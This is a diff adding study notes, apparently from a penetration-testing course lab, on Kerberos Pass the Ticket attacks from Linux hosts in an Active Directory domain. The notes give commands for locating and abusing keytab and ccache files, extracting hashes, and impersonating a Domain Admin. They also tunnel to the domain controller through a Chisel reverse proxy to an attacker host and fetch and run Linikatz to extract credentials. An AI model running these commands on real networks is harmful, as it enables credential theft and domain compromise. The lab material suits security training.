@@ -1175,4 +1175,214 @@ The above command will open a new cmd window. From that window, we can execute R
 ```
  Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
 ```
+# Pass the Ticket (PtT) from Linux
+Linux computers can connect to Active Directory to provide centralized identity management and integrate with the organization's systems, giving users the ability to have a single identity to authenticate on Linux and Windows computers.
+
+## Kerberos on Linux
+Linux machines store Kerberos tickets as ccache files in the /tmp directory.
+By default, the location of the Kerberos ticket is stored in the environment variable KRB5CCNAME. These ccache files are protected by reading and write permissions, but a user with elevated privileges or root privileges could easily gain access to these tickets.
+
+A keytab is a file containing pairs of Kerberos principals and encrypted keys (which are derived from the Kerberos password). You can use a keytab file to authenticate to various remote systems using Kerberos without entering a password. Keytab files commonly allow scripts to authenticate automatically using Kerberos without requiring human interaction or access to a password stored in a plain text file. 
+## Scenario
+To practice and understand how we can abuse Kerberos from a Linux system, we have a computer (LINUX01) connected to the Domain Controller. This machine is only reachable through MS01. To access this machine over SSH, we can connect to MS01 via RDP and, from there, connect to the Linux machine using SSH from the Windows command line. Another option is to use a port forward. 
+### Linux Auth from MS01 Image
+![image](https://github.com/user-attachments/assets/a4e2560e-e96a-4473-8a07-219ac4e97e3e)
+As an alternative, we created a port forward to simplify the interaction with LINUX01. By connecting to port TCP/2222 on MS01, we will gain access to port TCP/22 on LINUX01.
+Let's assume we are in a new assessment, and the company gives us access to LINUX01 and the user david@inlanefreight.htb and password Password2.
+
+### Linux Auth via Port Forward
+```
+ ssh david@inlanefreight.htb@10.129.204.23 -p 2222
+ ```
+## Identifying Linux and Active Directory Integration
+Realm to identify the machine is domain joined. tool used to manage system enrollment in a domain and set which domain users or groups are allowed to access the local system resources.
+### realm - Check If Linux Machine is Domain Joined
+```
+ realm list
+```
+In case realm is not available, look for tools sssd or winbind this tells its domain joined.
+### PS - Check if Linux Machine is Domain Joined
+```
+ps -ef | grep -i "winbind\|sssd"
+```
+## Finding Kerberos Tickets in Linux
+ Kerberos tickets can be found in different places depending on the Linux implementation or the administrator changing default settings. 
+
+### Finding Keytab Files
+Kerberos ticket to be used with a script, it sets the extension to .keytab.
+```
+find / -name *keytab* -ls 2>/dev/null
+```
+Another way to find keytab files is in automated scripts configured using a cronjob or any other Linux service. 
+### Identifying Keytab Files in Cronjobs
+```
+crontab -l
+```
+kinit allows interaction with Kerberos, and its function is to request the user's TGT and store this ticket in the cache (ccache file). Use kinit to import a keytab into our session and act as the user.
+## Finding ccache Files
+A credential cache or ccache file holds Kerberos credentials while they remain valid and, generally, while the user's session lasts. Once a user authenticates to the domain, a ccache file is created that stores the ticket information. The path to this file is placed in the KRB5CCNAME environment variable. 
+
+### Reviewing Environment Variables for ccache Files.
+```
+env | grep -i krb5
+```
+ccache files are located, by default, at /tmp.  We can search for users who are logged on to the computer, and if we gain access as root or a privileged user, we would be able to impersonate a user using their ccache file while it is still valid.
+
+### Searching for ccache Files in /tmp
+```
+ ls -la /tmp
+```
+## Abusing KeyTab Files
+Impersonate using **kinit**. Know the details of file using **klist**.
+### Listing keytab File Information
+```
+klist -k -t /opt/specialfiles/carlos.keytab 
+```
+### Impersonating a User with a keytab
+```
+ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
+```
+```
+ klist
+```
+### Connecting to SMB Share as Carlos
+To confirm access.
+```
+smbclient //dc01/carlos -k -c ls
+```
+## Keytab Extract 
+Extract secrets from keytab file. To gain access tpo his account we need to crack hashes ( https://crackstation.net/ or use hashcat/john the ripper) after extracting them from keytab file.
+### Extracting Keytab Hashes with KeyTabExtract
+```
+python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
+```
+The script will extract information such as the realm, Service Principal, Encryption Type, and Hashes.
+
+With the NTLM hash, we can perform a Pass the Hash attack. With the AES256 or AES128 hash, we can forge our tickets using Rubeus or attempt to crack the hashes to obtain the plaintext password.
+
+### Log in as Carlos
+```
+ su - carlos@inlanefreight.htb
+```
+Obtaining More Hashes
+Carlos has a cronjob that uses a keytab file named svc_workstations.kt. We can repeat the process, crack the password, and log in as svc_workstations.
+
+## Abusing Keytab ccache
+To abuse a ccache file, all we need is read privileges on the file. These files, located in /tmp, can only be read by the user who created them, but if we gain root access, we could use them.
+### Privilege Escalation to Root
+```
+ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222
+```
+identify which tickets are present on the machine
+### Looking for ccache Files
+```
+ ls -la /tmp
+ ```
+### Identifying Group Membership with the id Command
+```
+id julio@inlanefreight.htb
+```
+Julio is a member of the Domain Admins group. We can attempt to impersonate the user and gain access to the DC01 Domain Controller host.
+To use a ccache file, we can copy the ccache file and assign the file path to the KRB5CCNAME variable.
+### Importing the ccache File into our Current Session
+```
+cp /tmp/krb5cc_647401106_I8I133 .
+```
+```
+export KRB5CCNAME=/root/krb5cc_647401106_I8I133
+```
+```
+klist
+```
+## Using Linux Attack Tools with Kerberos
+1. **Kerberos Authentication Basics**  
+   - Most Linux attack tools support Kerberos for Windows and Active Directory interaction.
+   - Ensure `KRB5CCNAME` is set to the target ccache file (ticket cache) for domain-joined machines.
+
+2. **Non-Domain Attack Host Setup**  
+   - If the attack host isn't domain-joined, ensure it can reach the KDC or Domain Controller and has domain name resolution.
+   - When direct resolution isn’t available, use traffic proxying and custom hosts.
+
+3. **Proxy and Host Configuration**  
+   - **Chisel**: Proxy traffic via MS01 using **Chisel** and **Proxychains**.
+   - **Modify `/etc/hosts`**:
+     ```bash
+     # Host addresses
+     172.16.1.10 inlanefreight.htb inlanefreight dc01.inlanefreight.htb dc01
+     172.16.1.5  ms01.inlanefreight.htb  ms01
+     ```
+
+4. **Configure Proxychains**  
+   - Edit `/etc/proxychains.conf` to add:
+     ```plaintext
+     [ProxyList]
+     socks5 127.0.0.1 1080
+     ```
+
+5. **Download and Setup Chisel on Attack Host**  
+   - Install **Chisel**:
+     ```bash
+     wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
+     gzip -d chisel_1.7.7_linux_amd64.gz
+     mv chisel_* chisel && chmod +x ./chisel
+     sudo ./chisel server --reverse
+     ```
+
+6. **Run Chisel Client on MS01**  
+   - Connect to MS01 with RDP:
+     ```bash
+     xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
+     ```
+   - Run Chisel client on MS01:
+     ```plaintext
+     c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
+     ```
+
+7. **Set Environment Variable for Kerberos**  
+   - Transfer `ccache` file and set `KRB5CCNAME`:
+     ```bash
+     export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
+     ```
+
+This setup enables Kerberos authentication for Linux tools via MS01 while handling name resolution and proxying challenges on non-domain hosts.
+
+8. To use the reverse proxy we need **proxychains** with **Impacket** and the kerberos ticket
+   ```
+    proxychains impacket-wmiexec dc01 -k
+   ```
+OR
+
+**Evil-Winrm**
+To use evil-winrm with Kerberos, we need to install the Kerberos package used for network authentication.
+```
+sudo apt-get install krb5-user -y
+```
+While installing, we'll get a prompt for the Kerberos realm. Use the domain name: INLANEFREIGHT.HTB, and the KDC is the DC01.
+![image](https://github.com/user-attachments/assets/6cabdb8a-66c3-45fe-9ecf-abc4a16db39e)
+In case the package krb5-user is already installed, change the configuration file `/etc/krb5.conf`.
+
+**Using Evil-WinRM with Kerberos**
+```
+proxychains evil-winrm -i dc01 -r inlanefreight.htb
+```
+## Miscellaneous
+If we want to use a ccache file in Windows or a kirbi file in a Linux machine, we can use impacket-ticketConverter to convert them. 
+### Impacket Ticket Converter
+```
+impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
+```
+do the reverse operation by first selecting a .kirbi file. Let's use the .kirbi file in Windows.
+### Importing Converted Ticket into Windows Session with Rubeus
+```
+C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
+```
+## Linikatz
+Linikatz is a similar tool designed for Linux systems, inspired by Mimikatz. While Mimikatz focuses on Windows, Linikatz serves to extract and manipulate credentials in Linux environments.This tool will extract all credentials, including Kerberos tickets, from different Kerberos implementations such as FreeIPA, SSSD, Samba, Vintella, etc. it will place them in a folder name that starts with **linikatz.**.
+### Linikatz Download and Execution
+```
+wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
+```
+```
+/opt/linikatz.sh
+```
 
